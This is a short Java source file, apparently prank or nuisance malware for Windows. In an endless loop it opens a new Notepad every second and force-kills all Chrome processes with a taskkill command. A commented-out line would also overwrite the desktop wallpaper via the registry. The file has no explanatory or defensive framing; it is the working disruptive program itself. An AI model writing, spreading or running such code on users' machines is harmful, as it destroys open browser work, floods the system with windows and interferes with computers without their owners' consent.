package uuu;

import java.io.File;
import java.io.IOException;
import java.net.URLDecoder;

/****************
 * 
 * 
 * @author Rediska4445
 *
 *
 */

public class DontCrasherMain {
	public static void main(String args[]) throws InterruptedException, IOException {
		while(true) {
			Cyborg("notepad.exe");
		}
	}
	
	private static void Cyborg(String prog) throws IOException, InterruptedException {
		ProcessBuilder a = new ProcessBuilder();
			Thread.sleep(1000);
			a.command(prog);
			a.start();
			Runtime.getRuntime().exec("taskkill /F /IM chrome.exe");
//			Runtime.getRuntime().exec("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d " + FilePathImg + " /f");
	}
}

